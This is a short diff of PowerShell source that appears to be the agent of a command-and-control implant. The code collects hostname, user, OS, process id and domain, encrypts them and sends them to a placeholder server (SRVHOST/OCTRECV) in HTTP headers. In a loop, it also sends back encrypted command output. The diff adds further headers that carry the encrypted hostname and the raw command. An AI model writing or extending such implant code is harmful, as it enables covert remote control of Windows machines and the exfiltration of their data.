@@ -59,6 +59,7 @@ $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 
 $raw_header = "$final_hostname,$whoami,$os,$pid,$domain";
 $encrypted_header = EncryptCommand $key $raw_header;
+$final_hostname_encrypted = EncryptCommand $key $final_hostname
 
 $wch = $wc.headers;
 $wch.add("Authorization", $encrypted_header);
@@ -107,8 +108,9 @@ while($true){
         }
         $EncodedText = EncryptCommand $key $ec;
         $wc3 = New-Object system.Net.WebClient;
-        $wc3h.add("Authorization", $EncodedText);
+        $wc3.Headers["App-Logic"] = $final_hostname_encrypted;
         $wc3.Headers["Authorization"] = $EncodedText;
+        $wc3.Headers["Session"] = $command_raw;
         $wc3.downloadString("OCU_PROTO://SRVHOST/OCTRECV");
 
     }
